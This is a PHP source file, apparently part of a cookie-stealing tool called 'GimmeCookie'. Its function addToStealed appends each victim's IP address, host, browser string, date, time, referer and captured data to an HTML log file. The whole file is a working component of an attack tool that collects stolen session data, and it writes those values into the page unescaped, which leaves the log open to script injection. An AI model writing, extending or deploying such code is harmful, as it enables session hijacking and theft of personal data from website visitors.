<?PHP
// Protection against unauthorized access
if (!defined('GimmeCookie')) {
    header('Location: ./main');
    die;
}

function addToStealed($file, $ip, $host, $navigator, $date, $time, $referer, $data)
{
	$tmp  = file($file);
	$st = '';

	while($actualLine = array_shift($tmp))
	{
		if($actualLine == "<!-- Breakpoint -->\n")
		{
			$st .= "<tr><td>$ip</td><td>$host</td><td>$navigator</td><td>$date</td><td>$time</td><td>$referer</td><td>$data</td></tr>";
			$st .= "\n<!-- Breakpoint -->\n";
		}
		else
			$st .= $actualLine;
	}
	
	$ifs = fopen($file, 'w');
	fseek($ifs, 0);
	fputs($ifs, $st);
	fclose($ifs);
}